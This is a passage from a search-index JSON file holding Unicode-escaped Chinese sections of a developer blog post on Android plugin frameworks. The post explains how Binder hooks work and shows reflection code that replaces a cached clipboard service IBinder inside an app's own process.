\u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff1b\u6ce8\u610f\u770b\u6ce8\u91ca\uff0c\u8be6\u7ec6\u89e3\u91ca\u53ef\u4ee5\u770b \u4ee3\u7801 \u66ff\u6362ServiceManager\u7684 IBinder \u5bf9\u8c61 \u73b0\u5728\u5c31\u662f\u4e07\u4e8b\u5177\u5907\uff0c\u53ea\u6b20\u4e1c\u98ce\u4e86\uff1b\u6211\u4eec\u4f7f\u7528\u53cd\u5c04\u7684\u65b9\u5f0f\u4fee\u6539 ServiceManager \u7c7b\u91cc\u9762\u7f13\u5b58\u7684Binder\u5bf9\u8c61\uff0c\u4f7f\u5f97 getService \u65b9\u6cd5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\uff0c\u8fdb\u800c asInterface \u65b9\u6cd5\u4f7f\u7528\u4f2a\u9020 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fd4\u56de\u4e86\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u4ee3\u7801\u8f83\u7b80\u5355\uff0c\u5982\u4e0b\uff1a final String CLIPBOARD_SERVICE = \"clipboard\";// \u4e0b\u9762\u8fd9\u4e00\u6bb5\u7684\u610f\u601d\u5b9e\u9645\u5c31\u662f: ServiceManager.getService(\"clipboard\");// \u53ea\u4e0d\u8fc7 ServiceManager\u8fd9\u4e2a\u7c7b\u662f@hide\u7684Class<?> serviceManager = Class.forName(\"android.os.ServiceManager\");Method getService = serviceManager.getDeclaredMethod(\"getService\", String.class);// ServiceManager\u91cc\u9762\u7ba1\u7406\u7684\u539f\u59cb\u7684Clipboard Binder\u5bf9\u8c61// \u4e00\u822c\u6765\u8bf4\u8fd9\u662f\u4e00\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61IBinder rawBinder = (IBinder) getService.invoke(null, CLIPBOARD_SERVICE);// Hook \u6389\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5// \u7136\u540e\u5728 queryLocalInterface \u8fd4\u56de\u4e00\u4e2aIInterface\u5bf9\u8c61, hook\u6389\u6211\u4eec\u611f\u5174\u8da3\u7684\u65b9\u6cd5\u5373\u53ef.IBinder hookedBinder = (IBinder) Proxy.newProxyInstance(serviceManager.getClassLoader(), new Class<?>[] { IBinder.class }, new BinderProxyHookHandler(rawBinder));// \u628a\u8fd9\u4e2ahook\u8fc7\u7684Binder\u4ee3\u7406\u5bf9\u8c61\u653e\u8fdbServiceManager\u7684cache\u91cc\u9762// \u4ee5\u540e\u67e5\u8be2\u7684\u65f6\u5019 \u4f1a\u4f18\u5148\u67e5\u8be2\u7f13\u5b58\u91cc\u9762\u7684Binder, \u8fd9\u6837\u5c31\u4f1a\u4f7f\u7528\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684Binder\u4e86Field cacheField = serviceManager.getDeclaredField(\"sCache\");cacheField.setAccessible(true);Map<String, IBinder> cache = (Map) cacheField.get(null);cache.put(CLIPBOARD_SERVICE, hookedBinder); \u63a5\u4e0b\u6765\uff0c\u5728app\u91cc\u9762\u4f7f\u7528\u526a\u5207\u7248\uff0c\u6bd4\u5982\u957f\u6309\u8fdb\u884c\u7c98\u8d34\u4e4b\u540e\uff0c\u526a\u5207\u7248\u7684\u5185\u5bb9\u6c38\u8fdc\u90fd\u662f you are hooked \u4e86\uff1b\u8fd9\u6837\uff0c\u6211\u4eecHook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u5ba3\u544a\u5b8c\u6210\uff01\u8be6\u7ec6\u7684\u4ee3\u7801\u53c2\u89c1 github \u3002 \u4e5f\u8bb8\u4f60\u4f1a\u95ee\uff0c\u63d2\u4ef6\u6846\u67b6\u4f1a\u8fd9\u4e48hook\u5417\uff1f\u5982\u679c\u4e0d\u662f\u90a3\u4e48\u63d2\u4ef6\u6846\u67b6hook\u8fd9\u4e9b\u5e72\u4ec0\u4e48\uff1f\u63d2\u4ef6\u6846\u67b6\u5f53\u7136\u4e0d\u4f1a\u505a\u66ff\u6362\u6587\u672c\u8fd9\u4e48\u65e0\u804a\u7684\u4e8b\u60c5\uff0cDroidPlugin\u63d2\u4ef6\u6846\u67b6\u7ba1\u7406\u63d2\u4ef6\u4f7f\u5f97\u63d2\u4ef6\u5c31\u50cf\u662f\u4e3b\u7a0b\u5e8f\u4e00\u6837\uff0c\u56e0\u6b64\u63d2\u4ef6\u9700\u8981\u4f7f\u7528\u4e3b\u7a0b\u5e8f\u7684\u526a\u5207\u7248\uff0c\u63d2\u4ef6\u4e4b\u95f4\u4e5f\u4f1a\u5171\u7528\u526a\u5207\u7248\uff1b\u5176\u4ed6\u7684\u4e00\u4e9b\u7cfb\u7edf\u670d\u52a1\u4e5f\u7c7b\u4f3c\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8fbe\u5230\u63d2\u4ef6\u548c\u5bbf\u4e3b\u7a0b\u5e8f\u4e4b\u95f4\u7684\u5929\u8863\u670d\u7f1d\uff0c\u6c34\u4e73\u4ea4\u878d\uff01\u53e6\u5916\uff0c ActivityManager \u4ee5\u53ca PackageManager \u8fd9\u4e24\u4e2a\u7cfb\u7edf\u670d\u52a1\u867d\u7136\u4e5f\u53ef\u4ee5\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0fhook\uff0c\u4f46\u662f\u7531\u4e8e\u5b83\u4eec\u7684\u91cd\u8981\u6027\u548c\u7279\u6b8a\u6027\uff0cDroidPlugin\u4f7f\u7528\u4e86\u53e6\u5916\u4e00\u79cd\u65b9\u5f0f\uff0c\u6211\u4eec\u4f1a\u5355\u72ec\u8bb2\u89e3\u3002 \u559c\u6b22\u5c31\u70b9\u4e2a\u8d5e\u5427\uff5e\u6301\u7eed\u66f4\u65b0\uff0c\u8bf7\u5173\u6ce8github\u9879\u76ee understand-plugin-framework \u548c\u6211\u7684 \u535a\u5ba2 ! \u539f\u6587\u94fe\u63a5\uff1a https://weishu.me/2016/02/16/understand-plugin-framework-binder-hook/","title":"Android\u63d2\u4ef6\u5316\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4bBinder Hook"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#androidhookbinder-hook","text":"Android\u7cfb\u7edf\u901a\u8fc7Binder\u673a\u5236\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u4e00\u7cfb\u5217\u7684\u7cfb\u7edf\u670d\u52a1\uff0c\u8bf8\u5982 ActivityManagerService \uff0c ClipboardManager \uff0c AudioManager \u7b49\uff1b\u8fd9\u4e9b\u5e7f\u6cdb\u5b58\u5728\u7cfb\u7edf\u670d\u52a1\u7ed9\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u4e86\u8bf8\u5982\u4efb\u52a1\u7ba1\u7406\uff0c\u97f3\u9891\uff0c\u89c6\u9891\u7b49\u5f02\u5e38\u5f3a\u5927\u7684\u529f\u80fd\u3002 \u63d2\u4ef6\u6846\u67b6\u4f5c\u4e3a\u5404\u4e2a\u63d2\u4ef6\u7684\u7ba1\u7406\u8005\uff0c\u4e3a\u4e86\u4f7f\u5f97\u63d2\u4ef6\u80fd\u591f \u65e0\u7f1d\u5730 \u4f7f\u7528\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\uff0c\u81ea\u7136\u4f1a\u5bf9\u8fd9\u4e9b\u7cfb\u7edf\u670d\u52a1\u505a\u51fa\u4e00\u5b9a\u7684\u6539\u9020(Hook)\uff0c\u4f7f\u5f97\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u4f7f\u7528\u66f4\u52a0\u65b9\u4fbf\uff0c\u4ece\u800c\u5927\u5927\u964d\u4f4e\u63d2\u4ef6\u7684\u5f00\u53d1\u548c\u7ef4\u62a4\u6210\u672c\u3002\u6bd4\u5982\uff0cHook\u4f4f ActivityManagerService \u53ef\u4ee5\u8ba9\u63d2\u4ef6\u65e0\u7f1d\u5730\u4f7f\u7528 startActivity \u65b9\u6cd5\u800c\u4e0d\u662f\u4f7f\u7528\u7279\u5b9a\u7684\u65b9\u5f0f(\u6bd4\u5982that\u8bed\u6cd5)\u6765\u542f\u52a8\u63d2\u4ef6\u6216\u8005\u4e3b\u7a0b\u5e8f\u7684\u4efb\u610f\u754c\u9762\u3002 \u6211\u4eec\u628a\u8fd9\u79cdHook\u7cfb\u7edf\u670d\u52a1\u7684\u673a\u5236\u79f0\u4e4b\u4e3aBinder Hook\uff0c\u56e0\u4e3a\u672c\u8d28\u4e0a\u8fd9\u4e9b\u670d\u52a1\u63d0\u4f9b\u8005\u90fd\u662f\u5b58\u5728\u4e8e\u7cfb\u7edf\u5404\u4e2a\u8fdb\u7a0b\u7684Binder\u5bf9\u8c61\u3002\u56e0\u6b64\uff0c\u8981\u7406\u89e3\u63a5\u4e0b\u6765\u7684\u5185\u5bb9\u5fc5\u987b\u4e86\u89e3Android\u7684Binder\u673a\u5236\uff0c\u53ef\u4ee5\u53c2\u8003\u6211\u4e4b\u524d\u7684\u6587\u7ae0 Binder\u5b66\u4e60\u6307\u5357 \u9605\u8bfb\u672c\u6587\u4e4b\u524d\uff0c\u53ef\u4ee5\u5148clone\u4e00\u4efd understand-plugin-framework \uff0c\u53c2\u8003\u6b64\u9879\u76ee\u7684 binder-hook \u6a21\u5757\u3002\u53e6\u5916\uff0c\u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u7cfb\u5217\u6587\u7ae0\u89c1 \u7d22\u5f15 \u3002","title":"Android\u63d2\u4ef6\u5316\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4bBinder Hook"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#_1","text":"\u6211\u4eec\u77e5\u9053\u7cfb\u7edf\u7684\u5404\u4e2a\u8fdc\u7a0bservice\u5bf9\u8c61\u90fd\u662f\u4ee5Binder\u7684\u5f62\u5f0f\u5b58\u5728\u7684\uff0c\u800c\u8fd9\u4e9bBinder\u6709\u4e00\u4e2a\u7ba1\u7406\u8005\uff0c\u90a3\u5c31\u662f ServiceManager \uff1b\u6211\u4eec\u8981Hook\u6389\u8fd9\u4e9bservice\uff0c\u81ea\u7136\u8981\u4ece\u8fd9\u4e2a ServiceManager \u4e0b\u624b\uff0c\u4e0d\u7136\u661f\u7f57\u68cb\u5e03\u7684Binder\u5e7f\u6cdb\u5b58\u5728\u4e8e\u7cfb\u7edf\u7684\u5404\u4e2a\u89d2\u843d\uff0c\u8981\u4e00\u4e2a\u4e2a\u627e\u51fa\u6765\u8fd8\u771f\u662f\u5927\u6d77\u635e\u9488\u3002 \u56de\u60f3\u4e00\u4e0b\u6211\u4eec\u4f7f\u7528\u7cfb\u7edf\u670d\u52a1\u7684\u65f6\u5019\u662f\u600e\u4e48\u5e72\u7684\uff0c\u60f3\u5fc5\u8fd9\u4e2a\u5927\u5bb6\u4e00\u5b9a\u518d\u719f\u6089\u4e0d\u8fc7\u4e86\uff1a\u901a\u8fc7 Context \u5bf9\u8c61\u7684 getSystemService \u65b9\u6cd5\uff1b\u6bd4\u5982\u8981\u4f7f\u7528 ActivityManager \uff1a ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE); \u53ef\u662f\u8fd9\u4e2a\u8c8c\u4f3c\u8ddf ServiceManager \u6ca1\u6709\u4ec0\u4e48\u5173\u7cfb\u554a\uff1f\u6211\u4eec\u518d\u67e5\u770b getSystemService \u65b9\u6cd5\uff1b(Context\u7684\u5b9e\u73b0\u5728 ContextImpl \u91cc\u9762)\uff1a public Object getSystemService(String name) { ServiceFetcher fetcher = SYSTEM_SERVICE_MAP.get(name); return fetcher == null ? null : fetcher.getService(this);} \u5f88\u7b80\u5355\uff0c\u6240\u6709\u7684service\u5bf9\u8c61\u90fd\u4fdd\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\uff0c\u6211\u4eec\u518d\u770b\u8fd9\u4e2amap\u662f\u600e\u4e48\u521d\u59cb\u5316\u7684\uff1a registerService(ACCOUNT_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { IBinder b = ServiceManager.getService(ACCOUNT_SERVICE); IAccountManager service = IAccountManager.Stub.asInterface(b); return new AccountManager(ctx, service); }}); \u5728 ContextImpl \u7684\u9759\u6001\u521d\u59cb\u5316\u5757\u91cc\u9762\uff0c\u6709\u7684Service\u662f\u50cf\u4e0a\u9762\u8fd9\u6837\u521d\u59cb\u5316\u7684\uff1b\u53ef\u4ee5\u770b\u5230\uff0c\u786e\u5b9e\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5f53\u7136\u8fd8\u6709\u4e00\u4e9bservice\u5e76\u6ca1\u6709\u76f4\u63a5\u4f7f\u7528 ServiceManager \uff0c\u800c\u662f\u505a\u4e86\u4e00\u5c42\u5305\u88c5\u5e76\u8fd4\u56de\u4e86\u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff0c\u6bd4\u5982\u6211\u4eec\u7684 ActivityManager \uff0c\u5b83\u8fd4\u56de\u7684\u662f ActivityManager \u8fd9\u4e2a\u5305\u88c5\u5bf9\u8c61\uff1a registerService(ACTIVITY_SERVICE, new ServiceFetcher() { public Object createService(ContextImpl ctx) { return new ActivityManager(ctx.getOuterContext(), ctx.mMainThread.getHandler()); }}); \u4f46\u662f\u5728 ActivityManager \u8fd9\u4e2a\u7c7b\u5185\u90e8\uff0c\u4e5f\u4f7f\u7528\u4e86 ServiceManager \uff1b\u5177\u4f53\u6765\u8bf4\uff0c\u56e0\u4e3aActivityManager\u91cc\u9762\u6240\u6709\u7684\u6838\u5fc3\u64cd\u4f5c\u90fd\u662f\u4f7f\u7528 ActivityManagerNative.getDefault() \u5b8c\u6210\u7684\u3002\u90a3\u4e48\u8fd9\u4e2a\u8bed\u53e5\u5e72\u4e86\u4ec0\u4e48\u5462\uff1f private static final Singleton<IActivityManager> gDefault = new Singleton<IActivityManager>() { protected IActivityManager create() { IBinder b = ServiceManager.getService(\"activity\"); IActivityManager am = asInterface(b); return am; } }; \u56e0\u6b64\uff0c\u901a\u8fc7\u5206\u6790\u6211\u4eec\u5f97\u77e5\uff0c\u7cfb\u7edfService\u7684\u4f7f\u7528\u5176\u5b9e\u5c31\u5206\u4e3a\u4e24\u6b65\uff1a IBinder b = ServiceManager.getService(\"service_name\"); // \u83b7\u53d6\u539f\u59cb\u7684IBinder\u5bf9\u8c61IXXInterface in = IXXInterface.Stub.asInterface(b); // \u8f6c\u6362\u4e3aService\u63a5\u53e3","title":"\u7cfb\u7edf\u670d\u52a1\u7684\u83b7\u53d6\u8fc7\u7a0b"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#hook","text":"\u5728 \u63d2\u4ef6\u6846\u67b6\u539f\u7406\u89e3\u6790\u2014\u2014Hook\u673a\u5236\u4e4b\u52a8\u6001\u4ee3\u7406 \u91cc\u9762\u6211\u4eec\u8bf4\u8fc7\uff0cHook\u5206\u4e3a\u4e09\u6b65\uff0c\u6700\u5173\u952e\u7684\u4e00\u6b65\u5c31\u662f\u5bfb\u627eHook\u70b9\u3002\u6211\u4eec\u73b0\u5728\u5df2\u7ecf\u641e\u6e05\u695a\u4e86\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8fc7\u7a0b\uff0c\u90a3\u4e48\u5c31\u9700\u8981\u627e\u51fa\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5728\u54ea\u4e2a\u73af\u8282\u662f\u6700\u5408\u9002hook\u7684\u3002 \u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u7684\u4f7f\u7528\u8005\u90fd\u662f\u5bf9\u7b2c\u4e8c\u6b65\u83b7\u53d6\u5230\u7684 IXXInterface \u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u5982\u679c\u6211\u4eec\u8981hook\u6389\u67d0\u4e2a\u7cfb\u7edf\u670d\u52a1\uff0c \u53ea\u9700\u8981\u628a\u7b2c\u4e8c\u6b65\u7684 asInterface \u65b9\u6cd5\u8fd4\u56de\u7684\u5bf9\u8c61\u4fee\u6539\u4e3a\u4e3a\u6211\u4eecHook\u8fc7\u7684\u5bf9\u8c61\u5c31\u53ef\u4ee5\u4e86\u3002","title":"\u5bfb\u627eHook\u70b9"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#asinterface","text":"\u63a5\u4e0b\u6765\u6211\u4eec\u5206\u6790 asInterface \u65b9\u6cd5\uff0c\u7136\u540e\u60f3\u529e\u6cd5\u628a\u8fd9\u4e2a\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u4fee\u6539\u4e3a\u6211\u4eecHook\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002\u8fd9\u91cc\u6211\u4eec\u4ee5\u7cfb\u7edf\u526a\u5207\u7248\u670d\u52a1\u4e3a\u4f8b\uff0c\u6e90\u7801\u4f4d\u7f6e\u4e3a android.content.IClipboard , IClipboard.Stub.asInterface \u65b9\u6cd5\u4ee3\u7801\u5982\u4e0b\uff1a public static android.content.IClipboard asInterface(android.os.IBinder obj) { if ((obj == null)) { return null; } android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 if (((iin != null) && (iin instanceof android.content.IClipboard))) { return ((android.content.IClipboard) iin); } return new android.content.IClipboard.Stub.Proxy(obj);} \u8fd9\u4e2a\u65b9\u6cd5\u7684\u610f\u601d\u5c31\u662f\uff1a\u5148\u67e5\u770b\u672c\u8fdb\u7a0b\u662f\u5426\u5b58\u5728\u8fd9\u4e2aBinder\u5bf9\u8c61\uff0c\u5982\u679c\u6709\u90a3\u4e48\u76f4\u63a5\u5c31\u662f\u672c\u8fdb\u7a0b\u8c03\u7528\u4e86\uff1b\u5982\u679c\u4e0d\u5b58\u5728\u90a3\u4e48\u521b\u5efa\u4e00\u4e2a\u4ee3\u7406\u5bf9\u8c61\uff0c\u8ba9\u4ee3\u7406\u5bf9\u8c61\u59d4\u6258\u9a71\u52a8\u5b8c\u6210\u8de8\u8fdb\u7a0b\u8c03\u7528\u3002 \u89c2\u5bdf\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u524d\u9762\u7684\u90a3\u4e2aif\u8bed\u53e5\u5224\u7a7a\u8fd4\u56de\u80af\u5b9a\u52a8\u4e0d\u4e86\u624b\u811a\uff1b\u6700\u540e\u4e00\u53e5\u8c03\u7528\u6784\u9020\u51fd\u6570\u7136\u540e\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4e5f\u662f\u65e0\u4ece\u4e0b\u624b\uff0c\u8981\u4fee\u6539 asInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u6211\u4eec\u552f\u4e00\u80fd\u505a\u7684\u5c31\u662f\u4ece\u8fd9\u4e00\u53e5\u4e0b\u624b\uff1a android.os.IInterface iin = obj.queryLocalInterface(DESCRIPTOR); // Hook\u70b9 \u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u4fee\u6539\u8fd9\u4e2a obj \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u5e76\u4fdd\u8bc1\u8fd9\u4e2a\u8fd4\u56de\u503c\u7b26\u5408\u63a5\u4e0b\u6765\u7684 if \u6761\u4ef6\u68c0\u6d4b\uff0c\u90a3\u4e48\u5c31\u8fbe\u5230\u4e86\u4fee\u6539 asInterface \u65b9\u6cd5\u8fd4\u56de\u503c\u7684\u76ee\u7684\u3002 \u800c\u8fd9\u4e2a obj \u5bf9\u8c61\u521a\u597d\u662f\u6211\u4eec\u7b2c\u4e00\u6b65\u8fd4\u56de\u7684 IBinder \u5bf9\u8c61\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c1d\u8bd5\u5bf9\u8fd9\u4e2a IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u8fdb\u884chook\u3002","title":"asInterface\u8fc7\u7a0b"},{"location":"Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/#getservice","text":"\u4e0a\u6587\u5206\u6790\u5f97\u77e5\uff0c\u6211\u4eec\u60f3\u8981\u4fee\u6539 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\uff1b\u83b7\u53d6 IBinder \u5bf9\u8c61\u7684\u8fc7\u7a0b\u5982\u4e0b\uff1a IBinder b = ServiceManager.getService(\"service_name\"); \u56e0\u6b64\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u4fee\u6539\u8fd9\u4e2a getService \u65b9\u6cd5\u7684\u8fd4\u56de\u503c\uff0c\u8ba9\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6211\u4eec\u4f2a\u9020\u8fc7\u7684 IBinder \u5bf9\u8c61\uff1b\u8fd9\u6837\uff0c\u6211\u4eec\u53ef\u4ee5\u5728\u81ea\u5df1\u4f2a\u9020\u7684 IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u4f5c\u5904\u7406\uff0c\u8fdb\u800c\u4f7f\u5f97 asInterface \u65b9\u6cd5\u8fd4\u56de\u5728 queryLocalInterface \u65b9\u6cd5\u91cc\u9762\u5904\u7406\u8fc7\u7684\u503c\uff0c\u6700\u7ec8\u5b9e\u73b0hook\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\u3002 \u5728\u8ddf\u8e2a\u8fd9\u4e2a getService \u65b9\u6cd5\u4e4b\u524d\u6211\u4eec\u601d\u8003\u4e00\u4e0b\uff0c\u7531\u4e8e\u7cfb\u7edf\u670d\u52a1\u662f\u4e00\u7cfb\u5217\u7684\u8fdc\u7a0bService\uff0c\u5b83\u4eec\u7684\u672c\u4f53\uff0c\u4e5f\u5c31\u662fBinder\u672c\u5730\u5bf9\u8c61\u4e00\u822c\u90fd\u5b58\u5728\u4e8e\u67d0\u4e2a\u5355\u72ec\u7684\u8fdb\u7a0b\uff0c\u5728\u8fd9\u4e2a\u8fdb\u7a0b\u4e4b\u5916\u7684\u5176\u4ed6\u8fdb\u7a0b\u5b58\u5728\u7684\u90fd\u662f\u8fd9\u4e9bBinder\u672c\u5730\u5bf9\u8c61\u7684\u4ee3\u7406\u3002\u56e0\u6b64\u5728\u6211\u4eec\u7684\u8fdb\u7a0b\u91cc\u9762\uff0c\u5b58\u5728\u7684\u4e5f\u53ea\u662f\u8fd9\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61\uff0c\u6211\u4eec\u4e5f\u53ea\u80fd\u5bf9\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u4e0b\u624b\u3002(\u5982\u679c\u8fd9\u4e00\u6bb5\u770b\u4e0d\u61c2\uff0c\u5efa\u8bae\u4e0d\u8981\u5f80\u4e0b\u770b\u4e86\uff0c\u5148\u770b Binder\u5b66\u4e60\u6307\u5357 ) \u7136\u540e\uff0c\u8fd9\u4e2a getService \u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u5982\u679c\u6b64\u65b9\u6cd5\u4ec0\u4e48\u90fd\u4e0d\u505a\uff0c\u62ff\u5230Binder\u4ee3\u7406\u5bf9\u8c61\u4e4b\u540e\u76f4\u63a5\u8fd4\u56de\uff1b\u90a3\u4e48\u6211\u4eec\u5c31\u65e0\u80fd\u4e3a\u529b\u4e86\uff1a\u6211\u4eec\u6ca1\u6709\u529e\u6cd5\u62e6\u622a\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u4e5f\u6ca1\u6709\u529e\u6cd5\u83b7\u53d6\u5230\u8fd9\u4e2a\u9759\u6001\u65b9\u6cd5\u91cc\u9762\u7684\u5c40\u90e8\u53d8\u91cf(\u5373\u6211\u4eec\u5e0c\u671b\u4fee\u6539\u7684\u90a3\u4e2aBinder\u4ee3\u7406\u5bf9\u8c61)\u3002 \u63a5\u4e0b\u6765\u5c31\u53ef\u4ee5\u770b\u8fd9\u4e2a getService \u7684\u4ee3\u7801\u4e86\uff1a public static IBinder getService(String name) { try { IBinder service = sCache.get(name); if (service != null) { return service; } else { return getIServiceManager().getService(name); } } catch (RemoteException e) { Log.e(TAG, \"error in getService\", e); } return null;} \u5929\u65e0\u7edd\u4eba\u4e4b\u8def\uff01 ServiceManager \u4e3a\u4e86\u907f\u514d\u6bcf\u6b21\u90fd\u8fdb\u884c\u8de8\u8fdb\u7a0b\u901a\u4fe1\uff0c\u628a\u8fd9\u4e9bBinder\u4ee3\u7406\u5bf9\u8c61\u7f13\u5b58\u5728\u4e00\u5f20 map \u91cc\u9762\u3002 \u6211\u4eec\u53ef\u4ee5\u66ff\u6362\u8fd9\u4e2amap\u91cc\u9762\u7684\u5185\u5bb9\u4e3aHook\u8fc7\u7684 IBinder \u5bf9\u8c61\uff0c\u7531\u4e8e\u7cfb\u7edf\u5728 getService \u7684\u65f6\u5019\u6bcf\u6b21\u90fd\u4f1a\u4f18\u5148\u67e5\u627e\u7f13\u5b58\uff0c\u56e0\u6b64\u8fd4\u56de\u7ed9\u4f7f\u7528\u8005\u7684\u90fd\u662f\u88ab\u6211\u4eec\u4fee\u6539\u8fc7\u7684\u5bf9\u8c61\uff0c\u4ece\u800c\u8fbe\u5230\u7792\u5929\u8fc7\u6d77\u7684\u76ee\u7684\u3002 \u603b\u7ed3\u4e00\u4e0b\uff0c\u8981\u8fbe\u5230\u4fee\u6539\u7cfb\u7edf\u670d\u52a1\u7684\u76ee\u7684\uff0c\u6211\u4eec\u9700\u8981\u5982\u4e0b\u4e24\u6b65\uff1a \u9996\u5148\u80af\u5b9a\u9700\u8981 \u4f2a\u9020\u4e00\u4e2a\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61 \uff0c\u63a5\u4e0b\u6765\u5c31\u8981\u60f3\u529e\u6cd5\u8ba9 asInterface \u80fd\u591f\u8fd4\u56de\u6211\u4eec\u7684\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u800c\u4e0d\u662f\u539f\u59cb\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u3002 \u901a\u8fc7\u4e0a\u6587\u5206\u6790\u6211\u4eec\u77e5\u9053\uff0c\u53ea\u8981\u8ba9 getService \u8fd4\u56de IBinder \u5bf9\u8c61\u7684 queryLocalInterface \u65b9\u6cd5\u76f4\u63a5\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u5c31\u80fd\u8fbe\u5230\u76ee\u7684\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u9700\u8981 \u4f2a\u9020\u4e00\u4e2aIBinder\u5bf9\u8c61 \uff0c\u4e3b\u8981\u662f\u4fee\u6539\u5b83\u7684 queryLocalInterface \u65b9\u6cd5\uff0c\u8ba9\u5b83\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u7684\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\uff1b\u7136\u540e\u628a\u8fd9\u4e2a\u4f2a\u9020\u5bf9\u8c61\u653e\u7f6e\u5728 ServiceManager \u7684\u7f13\u5b58 map \u91cc\u9762\u5373\u53ef\u3002 \u6211\u4eec\u901a\u8fc7Binder\u673a\u5236\u7684 \u4f18\u5148\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61 \u7684\u8fd9\u4e2a\u7279\u6027\u8fbe\u5230\u4e86Hook\u6389\u7cfb\u7edf\u670d\u52a1\u5bf9\u8c61\u7684\u76ee\u7684\u3002\u56e0\u6b64 queryLocalInterface \u4e5f\u5931\u53bb\u4e86\u5b83\u539f\u672c\u7684\u610f\u4e49(\u53ea\u67e5\u627e\u672c\u5730Binder\u5bf9\u8c61\uff0c\u6ca1\u6709\u672c\u5730\u5bf9\u8c61\u8fd4\u56denull)\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u662f\u4e00\u4e2a\u5080\u5121\uff0c\u662f\u6211\u4eec\u5b9e\u73b0hook\u7cfb\u7edf\u5bf9\u8c61\u7684\u6865\u6881\uff1a\u6211\u4eec\u901a\u8fc7\u8fd9\u4e2a\u201c\u6f0f\u6d1e\u201d\u8ba9 asInterface \u6c38\u8fdc\u90fd\u8fd4\u56de\u6211\u4eec\u4f2a\u9020\u8fc7\u7684\u5bf9\u8c61\u3002\u7531\u4e8e\u6211\u4eec\u63a5\u7ba1\u4e86 asInterface 